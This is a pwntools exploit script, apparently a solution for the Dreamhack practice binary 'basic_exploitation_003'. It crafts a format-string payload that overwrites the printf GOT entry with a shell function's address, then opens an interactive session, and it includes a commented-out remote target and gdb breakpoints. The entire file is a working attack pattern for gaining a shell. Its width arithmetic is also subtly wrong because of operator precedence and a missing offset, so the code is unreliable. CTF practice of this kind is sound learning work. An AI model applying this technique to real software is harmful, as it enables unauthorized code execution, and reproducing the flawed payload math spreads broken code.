from pwn import *

p = process('./basic_exploitation_003')
# p = remote('host1.dreamhack.games', 21624)

gdb.attach(p, """
b *main+99
b *main+79
""")

# exit_got = 0x804a024
printf_got = 0x0804a010
shell_addr = 0x08048669
# shell_addr = 0x0804866c

shell_addr_1 = shell_addr & 0xff
shell_addr_2 = (shell_addr & 0xff00) >> 8
shell_addr_3 = (shell_addr & 0xff0000) >> 16
shell_addr_4 = (shell_addr & 0xff000000) >> 24

# log.info(hex(shell_addr_low))
# log.info(hex(shell_addr_high))

payload = p32(printf_got)
payload += b'%' + str(shell_addr & 0xffff - len(payload)).encode() + b'c%1$hn'

# payload += b'%97c%1$hhn' + b'%29c%2$hhn'
log.info(payload)

p.sendline(payload)

p.interactive()